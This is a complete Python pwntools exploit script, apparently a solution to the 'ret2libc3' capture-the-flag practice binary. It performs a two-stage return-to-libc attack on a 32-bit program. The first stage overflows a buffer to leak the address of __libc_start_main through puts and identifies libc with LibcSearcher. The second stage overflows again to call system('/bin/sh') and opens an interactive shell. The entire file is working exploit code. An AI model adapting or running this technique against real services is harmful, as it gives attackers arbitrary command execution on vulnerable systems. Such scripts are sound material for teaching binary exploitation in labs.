#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
context.arch = 'i386'
context.log_level = 'debug'
p = process('./ret2libc3')
elf = ELF('./ret2libc3')
puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']
print 'puts_plt =', hex(puts_plt)
print 'libc_start_main_got =', hex(libc_start_main_got)
print 'main =', hex(main)
# gdb.attach(p, 'b *puts+331')
offset1 = 112
payload1 = (
	'A' * offset1 + 
	p32(puts_plt) + 
	p32(main) + 
	p32(libc_start_main_got)
)
p.recvuntil('Can you find it !?')
p.sendline(payload1)
libc_start_main_addr = u32(p.recv()[:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
print 'libcbase =', hex(libcbase)
offset2 = 104
payload2 = (
	'B' * offset2 + 
	p32(system_addr) + 
	p32(0x12345678) + 
	p32(binsh_addr)
)
p.sendline(payload2)
p.interactive()
